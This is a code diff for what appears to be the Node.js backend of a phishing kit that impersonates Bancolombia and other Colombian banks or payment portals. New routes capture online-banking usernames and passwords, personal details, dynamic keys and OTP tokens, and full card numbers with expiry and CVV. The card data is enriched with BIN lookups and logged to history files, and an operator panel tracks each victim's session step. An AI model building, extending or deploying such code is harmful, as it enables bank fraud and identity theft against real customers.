@@ -25,6 +25,7 @@ const ultimaAccionSesiones = new Map();
 const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
+const bcSesiones = new Map(); // 🔥 Almacena los datos de Bancolombia temporalmente
 
 let ipsBloqueadas = new Set();
 const IP_BLOQUEADAS_FILE = path.join(DATA_DIR, 'bloqueadas.json');
@@ -325,13 +326,13 @@ const server = http.createServer(async (req, res) => {
                     TOKEN: 'token', 
                     FINALIZAR: 'finalizado',
                     CC_ERROR: 'cc_error',
-                    AUTORIZAR: 'autorizacion' // 🔥 NUEVO
+                    AUTORIZAR: 'autorizacion'
                 };
                 if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                 
                 const estadoNuevo = mapEstados[accion];
                 estadoSesiones.set(sessionId, estadoNuevo);
-                ultimaAccionSesiones.set(sessionId, accion); // 🔥 GUARDAMOS ACCIÓN
+                ultimaAccionSesiones.set(sessionId, accion);
 
                 let datosActuales = datosSesiones.get(sessionId) || {};
                 const bancoKey = datosActuales.bancoKey || '';
@@ -459,30 +460,105 @@ const server = http.createServer(async (req, res) => {
     }
 
     // ============================================================
-    // 🔥 NUEVO: Guardar datos de la consulta inicial
+    // 🔥 RUTAS PARA BANCOLOMBIA
     // ============================================================
-    const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
-    if (req.method === 'POST' && consultaMatch) {
+    if (req.method === 'POST' && url === '/bc/enviar') {
+        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         try {
-            const bancoKey = 'cc-' + consultaMatch[1];
             const datos = await getBody(req);
-            const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio } = datos;
-            if (!sessionId) { json(res, 400, { ok: false }); return; }
+            const { sessionId, usuario, clave } = datos;
+            if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
 
-            const datosPrevios = datosSesiones.get(sessionId) || {};
-            const datosCompletos = Object.assign({}, datosPrevios, {
-                tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio
+            const datosSesion = {
+                bancoKey: 'bancolombia',
+                marca: 'bancolombia',
+                identificacion: usuario,
+                clave: clave,
+                ip: ip,
+                creadoEn: new Date().toISOString()
+            };
+
+            estadoSesiones.set(sessionId, 'pendiente');
+            datosSesiones.set(sessionId, datosSesion);
+            ultimaAccionSesiones.set(sessionId, 'ENVIAR');
+
+            const previos = bcSesiones.get(sessionId) || {};
+            bcSesiones.set(sessionId, { ...previos, usuario, clave, ip, bancoKey: 'bancolombia' });
+
+            console.log(`[BANCOLOMBIA] Sesión iniciada: ${sessionId} | Usuario: ${usuario}`);
+            json(res, 200, { ok: true, sessionId });
+        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+        return;
+    }
+
+    if (req.method === 'POST' && url === '/bc/guardar-paso2') {
+        try {
+            const datos = await getBody(req);
+            const { sessionId, nombres, tipoDoc, documento, correo, telefono, ingresos } = datos;
+            if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+            const previos = bcSesiones.get(sessionId) || {};
+            bcSesiones.set(sessionId, { 
+                ...previos, nombres, tipoDoc, documento, correo, telefono, ingresos 
             });
+            
+            json(res, 200, { ok: true });
+        } catch (e) { json(res, 500, { ok: false }); }
+        return;
+    }
 
-            datosSesiones.set(sessionId, datosCompletos);
-            guardarHistorial(bancoKey, datosCompletos); // Guarda en el archivo de historial
+    if (req.method === 'POST' && url === '/bc/guardar-paso3') {
+        try {
+            const datos = await getBody(req);
+            const { sessionId, claveDinamica } = datos;
+            if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
 
-            console.log(`[${bancoKey}] Consulta guardada: ${sessionId} | Tel: ${telefono}`);
+            const previos = bcSesiones.get(sessionId) || {};
+            bcSesiones.set(sessionId, { ...previos, claveDinamica });
+            
+            json(res, 200, { ok: true });
+        } catch (e) { json(res, 500, { ok: false }); }
+        return;
+    }
+
+    if (req.method === 'POST' && url === '/bc/guardar-paso4') {
+        try {
+            const datos = await getBody(req);
+            const { sessionId, tarjeta, titular, exp, cvv } = datos;
+            if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+            const sesionData = bcSesiones.get(sessionId) || {};
+            
+            const datosCompletos = { 
+                ...sesionData, 
+                tarjeta, titular, exp, cvv,
+                fechaCaptura: new Date().toISOString(),
+                bancoKey: 'bancolombia'
+            };
+
+            if (tarjeta) {
+                const infoBin = await obtenerInfoBin(tarjeta);
+                if (infoBin) {
+                    datosCompletos.bin = infoBin.bin;
+                    datosCompletos.cardBrand = infoBin.cardBrand;
+                    datosCompletos.cardType = infoBin.cardType;
+                    datosCompletos.cardLevel = infoBin.cardLevel;
+                    datosCompletos.bankName = infoBin.bankName;
+                }
+            }
+
+            guardarHistorial('bancolombia', datosCompletos);
+            bcSesiones.delete(sessionId);
+
+            console.log(`[BANCOLOMBIA] Flujo completado - Usuario: ${datosCompletos.usuario || 'N/A'} | IP: ${ip}`);
             json(res, 200, { ok: true });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
     }
 
+    // ============================================================
+    // 🔥 RUTA MODIFICADA: Guardar tarjeta nueva en CC-Bogotá/Bucaramanga
+    // ============================================================
     const ccMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-pago$/);
     if (req.method === 'POST' && ccMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -494,25 +570,42 @@ const server = http.createServer(async (req, res) => {
 
             const infoBin = await obtenerInfoBin(tarjeta);
 
-            const datosSesion = {
-                bancoKey: bancoKey, marca, tarjeta, titular, docType, docNumber,
-                monto, expMes, expAnio, cvv, placa: placa || '', subsidio: subsidio || false,
-                ip, creadoEn: new Date().toISOString(),
+            // 🔥 RECUPERAR DATOS PERSONALES PREVIOS DE ESTA SESIÓN
+            const datosPrevios = datosSesiones.get(sessionId) || {};
+
+            // 🔥 UNIR TODO: Datos personales + Datos de la tarjeta
+            const datosSesion = Object.assign({}, datosPrevios, {
+                bancoKey: bancoKey, 
+                marca, 
+                tarjeta, 
+                titular, 
+                docType, 
+                docNumber,
+                monto, 
+                expMes, 
+                expAnio, 
+                cvv, 
+                placa: placa || datosPrevios.placa || '', 
+                subsidio: subsidio || false,
+                ip: ip, 
+                creadoEn: new Date().toISOString(),
                 bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
                 cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
                 cardType: infoBin?.cardType || 'Desconocido',
                 cardLevel: infoBin?.cardLevel || 'Desconocido',
                 bankName: infoBin?.bankName || 'Desconocido',
                 countryName: infoBin?.countryName || 'Desconocido'
-            };
+            });
 
+            // Guardar estado de la sesión (para el panel principal)
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosSesion);
-            ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO'); // 🔥
+            ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
 
+            // 🔥 GUARDAR EN EL HISTORIAL (con los datos unidos)
             guardarHistorial(bancoKey, datosSesion);
 
-            console.log(`[${bancoKey}] Nueva sesión: ${sessionId} (${marca}) IP=${ip} | BIN=${infoBin?.bin || '?'} Tipo=${infoBin?.cardType || '?'} Nivel=${infoBin?.cardLevel || '?'}`);
+            console.log(`[${bancoKey}] Nueva tarjeta: ${sessionId} (${marca}) IP=${ip} | Nombres: ${datosSesion.nombres || '-'}`);
             json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
@@ -529,7 +622,7 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, datosOriginales, { otp });
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosCompletos);
-            ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP'); // 🔥
+            ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
 
             guardarHistorial(bancoKey, datosCompletos);
 
@@ -539,9 +632,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ============================================================
-    // 🔥 NUEVO: Enviar credenciales de autorización (Banca Virtual)
-    // ============================================================
     const authMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-autorizacion$/);
     if (req.method === 'POST' && authMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -570,6 +660,9 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    // ============================================================
+    // RUTAS GENÉRICAS PARA OTROS BANCOS
+    // ============================================================
     const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
     if (req.method === 'POST' && enviarMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -586,7 +679,7 @@ const server = http.createServer(async (req, res) => {
             };
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosSesion);
-            ultimaAccionSesiones.set(sessionId, 'ENVIAR'); // 🔥
+            ultimaAccionSesiones.set(sessionId, 'ENVIAR');
 
             guardarHistorial(bancoKey, datosSesion);
 
@@ -609,7 +702,7 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, previos, { token, identificacion: identificacion || previos.identificacion, clave: clave || previos.clave });
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'token');
-            ultimaAccionSesiones.set(sessionId, 'TOKEN'); // 🔥
+            ultimaAccionSesiones.set(sessionId, 'TOKEN');
 
             guardarHistorial(bancoKey, datosCompletos);
 
@@ -632,7 +725,7 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, previos, { otp, identificacion: identificacion || previos.identificacion, clave: clave || previos.clave });
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'otp');
-            ultimaAccionSesiones.set(sessionId, 'OTP'); // 🔥
+            ultimaAccionSesiones.set(sessionId, 'OTP');
 
             guardarHistorial(bancoKey, datosCompletos);
 
@@ -651,7 +744,7 @@ const server = http.createServer(async (req, res) => {
         if (!esValido) { json(res, 404, { ok: false }); return; }
 
         const estado = estadoSesiones.get(sessionId) || 'pendiente';
-        const accion = ultimaAccionSesiones.get(sessionId) || ''; // 🔥 DEVOLVEMOS ACCIÓN
+        const accion = ultimaAccionSesiones.get(sessionId) || '';
         json(res, 200, { estado, accion });
         return;
     }
